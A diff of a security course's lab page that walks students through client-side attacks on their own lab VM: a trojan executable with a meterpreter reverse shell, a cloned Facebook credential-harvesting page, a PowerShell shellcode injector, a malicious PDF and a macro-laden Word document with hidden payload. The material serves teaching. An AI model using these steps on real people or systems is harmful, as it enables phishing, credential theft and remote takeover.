@@ -7,7 +7,7 @@ published: true
 ---
 
 Today, social engineering attacks represent a major primary vector for hackers. As Bruce Schneier said, “Only amateurs attack machines; professionals target people.”[1](https://www.schneier.com/crypto-gram-0010.html)  
-Further, client-side software represents a much larger attack surface than server-side software. For these reason, many of the major breaches you read about in the news began with a client-side attack. 
+Further, client-side software represents a much larger attack surface than server-side software. For these reason, many of the major breaches you read about in the news began with a client-side attack.
 
 In this lab you’ll use two leading tools to perform client-side attacks: msfvenom and the Social Engineering Toolkit (SET). All of these attacks involve creating a malicious payload
 that you trick the user into executing. The Metasploit-Framework is used to create the payloads, and you are on your own to trick the user.
@@ -39,43 +39,43 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
     11.	Enter `use exploit/multi/handler`. Once you’ve switched to this exploit module, type `show info`. Note that this module “is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.” A stub adds additional functionality to other exploits.
     12.	Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
     13.	Enter `set LHOST [IP of Kali VM]`.
-    15.	Enter `exploit -j`. 
-    
+    15.	Enter `exploit -j`.
+
         <div class='alert alert-info' markdown='1'>
         The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
         </div>    
-        
+
         <div class='alert alert-info' markdown='1'>
         Because <code>ExitOnSession</code> is set to <code>True</code> (the default for `exploit/multi/handler`; verify with `show advanced` from msfconsole), your handler will die after it gets one connection.
         </div>
-    
-7.	Now, set up a web server to host your malicious file. 
+
+7.	Now, set up a web server to host your malicious file.
     8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
     8.	See that the payload you generated earlier is in this directory: `ls`
     9.  Now, from that directory, run this command:
 
             python -m SimpleHTTPServer 8888
-            
+
         This will start a web server on your kali instance, serving content from the current directory (`/tmp`).
-        
-    9.	On your Windows 10 VM, browse to: 
+
+    9.	On your Windows 10 VM, browse to:
 
             http://[IP of your Kali VM]:8888/
 
         Verify that you can view the contents of `/tmp` on your Kali VM.
 
-    
-16.	On your Windows 10 VM, in a web browser, download the malicious `AdobeUpdate.exe` file from the Python webserver and run the executable. 
+
+16.	On your Windows 10 VM, in a web browser, download the malicious `AdobeUpdate.exe` file from the Python webserver and run the executable.
     * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
-    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.” 
+    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.”
     * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
-    
+
 17.	On your Kali VM, you should see in your msfconsole that “Command shell session `X` opened,” where X is the number of the new session. Type:
 
         sessions -i [the number of the new session]
 
     This should open a connection to a meterpreter on the Windows VM.
-    
+
 17. Run `shell` to drop down into a windows cmd prompt
     18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
     19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
@@ -86,14 +86,14 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
 ## <span class='label label-success'>Deliverable</span>
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
-    
+
     pgrep AdobeUpdate.exe
     getpid
     shell
     echo "your first and last name"
     date /t
 
-The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process. 
+The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process.
 This establishes that you were successful in this exploit.
 
 The last three commands drop you into a windows shell where you can more easily establish your identity.
@@ -118,42 +118,42 @@ Nice, eh?
 
 # Part 2. Social Engineering Toolkit (SET) -- Site Cloner
 
-In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks. 
+In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks.
 
 1.	Navigate to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
-    
-    ![]({{ "/assets/images/lab_11_2.png" | relative_url }}){: .img-responsive width='50%'}
+
+		{% include lab-image.html image='lab_11_2.png' width="50%" %}
 
 2.	Enter option `1` for social-engineering attacks. That should display this menu:
-    
-    ![]({{ "/assets/images/lab_11_3.png" | relative_url }}){: .img-responsive width='50%'}
-    
+
+		{% include lab-image.html image='lab_11_3.png' width="50%" %}
+
 3.	Select option `2` for website attack vectors. The next menu will list the various web attack vectors:
 
-    ![]({{ "/assets/images/lab_11_4.png" | relative_url }}){: .img-responsive width='50%'}
-    
+		{% include lab-image.html image='lab_11_4.png' width="50%" %}
+
 4.	Select number `3` for a credential harvesting attack. This brings you to the following screen:
 
-    ![]({{ "/assets/images/lab_11_5.png" | relative_url }}){: .img-responsive width='50%'}
+		{% include lab-image.html image='lab_11_5.png' width="50%" %}
 
 5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to `192.168.55.101`, the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address in brackets (e.g., "[192.168.55.101]"), just push enter.
 
     Now you get to choose the website to clone. Set the cloned website to `https://www.facebook.com`.
-    
+
     **Note:** Be sure you enter "https" and "www" in the Facebook URL.
-    
+
     You should see the message:
-    
+
     	You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.
 		Press {return} if you understand what we're saying here.
 
-    
+
     Press enter to continue.  
 
     If all has gone well, you should see a screen like the following:
 
-    ![]({{ "/assets/images/lab_11_6.png" | relative_url }}){: .img-responsive width='50%'}
-    
+		{% include lab-image.html image='lab_11_6.png' width="50%" %}
+
 6.	Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:
 
     > “You are receiving this email because there is a problem with your account. Please go to www.facebook.com and login to verify your account."
@@ -162,16 +162,16 @@ In this section, you’ll use the Social Engineering Toolkit (SET) to craft soci
 
 7. Open the email in your Windows 10 VM. When you receive the email, click the link, which should forward you to this page:
 
-    ![]({{ "/assets/images/lab_11_7.png" | relative_url }}){: .img-responsive width='50%'}
-    
+		{% include lab-image.html image='lab_11_7.png' width="50%" %}
+
     **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a domain that looked similar to Facebook (like `facebook.webs.com`) For this, one could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).
-    
+
 8.	Enter fake credentials into the fields on the spoofed website. After you’ve filled the fields in with whatever words you wish, press the login button on the website. On your Kali VM, you should see something similar to this in your terminal window:
 
-    ![]({{ "/assets/images/lab_set_facebook.png" | relative_url }}){: .img-responsive width='50%'}
-        
+		{% include lab-image.html image='lab_set_facebook.png' width="50%" %}
+
     **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field found" messages are false positives. Just scroll up until you see your username and password.
-        
+
     **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field found" messages are false positives. Just scroll up until you see your username and password.
 
 ## <span class='label label-success'>Deliverable</span>
@@ -180,15 +180,15 @@ Take a screenshot of `setoolkit` reporting the capture of credentials you enter 
 
 *   `POSSIBLE USERNAME FIELD FOUND: your.first.and.last.name (or something else clearly identifying you)`
 *   `POSSIBLE PASSWORD FIELD FOUND: whatever.password.you.entered`
-        
-        
-        
-        
-        
+
+
+
+
+
 # Part 3. Social Engineering Toolkit (SET) -- PowerShell Shellcode Injector
 
-PowerShell is a powerful scripting language built into the Windows operating system. In this section, you will generate an encoded PowerShell script and 
-execute it on Windows which opens a Meterpreter session on attacker’s machine. 
+PowerShell is a powerful scripting language built into the Windows operating system. In this section, you will generate an encoded PowerShell script and
+execute it on Windows which opens a Meterpreter session on attacker’s machine.
 
 
 1.  Launch `setoolkit` if not already launched. From the main menu, choose `1` for `Social-Engineering Attacks`.
@@ -202,12 +202,12 @@ execute it on Windows which opens a Meterpreter session on attacker’s machine.
 5.	While waiting, open another terminal and navigate to `/root/.set/reports/powershell/`
 
 6.	From that directory, open the script using the leafpad command:
-        
+
         apt install leafpad     # if necessary
         leafpad x86_powershell_injection.txt
-    
+
 [//]: # Needs image:   ![]({{ "/assets/images/" | relative_url }}){: .img-responsive width='50%'}
-    
+
 7.	Copy the entire script you found on leafpad to the clipboard. On Windows, open a Paste the script on the windows command line as the figure depicts below. Then press enter.
 8.  You should see an opened Meterpreter session. Get the session id with `sessions` if you don't already see it, and then interact with that session with `sessions [id]`
 9.  **Optional:** you can save the entire script as a windows batch file (.bat), then trick the user to run that file.
@@ -217,14 +217,14 @@ execute it on Windows which opens a Meterpreter session on attacker’s machine.
 ## <span class='label label-success'>Deliverable</span>
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
-    
+
     pgrep powershell
     getpid
     shell
     echo "your first and last name"
     date /t
 
-The first command should show the process id related to your malicious powershell script, and the second verifies that you are tied to that process. 
+The first command should show the process id related to your malicious powershell script, and the second verifies that you are tied to that process.
 This establishes that you were successful in this exploit.
 
 The last three commands drop you into a windows shell where you can more easily establish your identity.
@@ -233,7 +233,7 @@ The last three commands drop you into a windows shell where you can more easily 
 
 # Part 4. Social Engineering Toolkit (SET) -- Malicious PDF
 
-This attack presumes that you still have the handler running listening for a connection from a `windows/meterpreter/reverse_tcp` payload, which was launched 
+This attack presumes that you still have the handler running listening for a connection from a `windows/meterpreter/reverse_tcp` payload, which was launched
 during the fake adobeupdate.exe section.
 
 Download and install a vulnerable version of Adobe Reader to the Windows 10 vm. v9.0 will do -- you can obtain it from [here](ftp://ftp.adobe.com/pub/adobe/reader/win/9.x/9.0/enu/AdbeRdr90_en_US.exe)
@@ -249,41 +249,41 @@ Download and install a vulnerable version of Adobe Reader to the Windows 10 vm. 
     * Accept default for payload listener LHOST by pressing enter.
     * Accept default for port to connect back on by pressing enter.
     * Let `SET` create a listener right now (`yes`)
-    
-2.  SET will have put the created payload in `/root/.set/template.pdf`. Your goal now is to get this pdf onto the victim machine. 
+
+2.  SET will have put the created payload in `/root/.set/template.pdf`. Your goal now is to get this pdf onto the victim machine.
     If you still have the Python server running in the `/tmp` dir from the fake adobeupdate part of this lab, then you can just move this payload there and download it
     to the victim machine as before. From a different Kali terminal than the `SET` one:
-    
+
         mv /root/.set/template.pdf /tmp
-        
+
     You can rename it to whatever you like.
-    
+
 3.  On the Windows 10 VM, save the PDF to the desktop by browsing to `http://192.168.55.101:8888`. Open the downloaded file with Adobe Reader
 
     * Right-click the downloaded file > `Open with...` > `Adobe Reader 9.0`
-    
+
 4.  Adobe Reader will open a dialog asking you whether you want to save a file that the document is attempting to extract. Do so, <span class='label label-info'>saving the file to a locaiton such as the desktop</span>.
 5.  Adobe Reader will then ask if you want to run a script embedded in the pdf document. Let it do so.
 6.  You should now have a meterpreter session opened on kali. Interact with it, and continue pwn-age.
-        
+
 
 ## <span class='label label-success'>Deliverable</span>
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
-    
+
     pgrep pdf
     getpid
     shell
     echo "your first and last name"
     date /t
 
-The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process. 
+The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process.
 This establishes that you were successful in this exploit.
 
 The last three commands drop you into a windows shell where you can more easily establish your identity.
 
 
-        
+
 <div class='alert alert-info'><strong>Optional:</strong> Explore! SET has much to offer. Just consider all the ways that you or members of your organization may be
 tricked into being compromised...</div>
 
@@ -312,68 +312,66 @@ In this section, you will create a macro-enabled Microsoft Word file that opens 
     The above commands will cause Metasploit to listen on port 8080 for an incoming Meterpreter connection.
 
 
-4.	Open Word. 
+4.	Open Word.
 
     <div class='alert alert-info'>If you are using the Word 2007 preinstalled on my distributed VM, when it launches, you will be asked for a license activation key. Simply close
     this dialog. You have trial-mode access.</div>
-    
-    1.  First, enable the Developer tool access if you haven't already. 
+
+    1.  First, enable the Developer tool access if you haven't already.
 
         ## Enable Developer tool access in Word 2007
-        
+
         Click the circle office button in the top left > Word Options button towards bottom-right > "Popular" > enable checkbox for "Show Developer tab in the Ribbon"
-        
+
         ## Enable Developer tool access in Word 2010 and higher
-        
+
         From the File tab, select Options. Select “Customize Ribbon” from the left-hand side menu, and check the Developer checkbox (see screenshot below).
 
-        ![]({{ "/assets/images/lab_11_8.png" | relative_url }}){: .img-responsive width='70%'}
+				{% include lab-image.html image='lab_11_8.png' width="70%" %}
 
     2.  From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.
-    
+
 		[//]: # Needs image:   ![]({{ "/assets/images/lab_11_9.png" | relative_url }}){: .img-responsive width='70%'}
-    
-        Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali. 
-        Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted. 
-        
+
+        Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali.
+        Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted.
+
         **Important for getting credit!** About 33 lines into the VBA code, you will see a line with a variable assignment some random gibberish that ends in `.exe`. You will need to know the random
         gibberish later for the deliverable for this question.
-        
-        
+
+
         Save it as a Word macro-enabled document (`.docm`) and close the VB editor.
-        
+
         [//]: # Needs image:   ![]({{ "/assets/images/lab_11_10.png" | relative_url }}){: .img-responsive width='70%'}
-    
-5.  In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the 
-    memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white. 
-    This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file 
+
+5.  In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the
+    memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white.
+    This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file
     (with a “.docm” extension). Name the file something like “Sales Memo.”
 
     **Optional:** “In order to keep user suspicion low, try embedding the code in one of the many Word macro games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.” From _Metasploit: The Pentester’s Guide_.
-    
-6.  Test your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a 
-    Meterpreter session has been opened to the host workstation. 
+
+6.  Test your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a
+    Meterpreter session has been opened to the host workstation.
     If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
-    
+
     **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`
 
 ## <span class='label label-success'>Deliverable</span>
-    
+
 Two screenshots for this one:
 
 1. A screenshot of the line showing the random gibberish `.exe` variable.
-    
+
 2.  Take a screenshot showing the output of running the following commands from your meterpreter session:
-    
+
         pgrep [the.random.gibberish.you.noted.earlier.exe]
         getpid
         shell
         echo "your first and last name"
         date /t
 
-    The first command should show the process id related to your trojan word doc, and the second verifies that you are tied to that process. 
+    The first command should show the process id related to your trojan word doc, and the second verifies that you are tied to that process.
     This establishes that you were successful in this exploit.
 
     The last three commands drop you into a windows shell where you can more easily establish your identity.
-    
-    
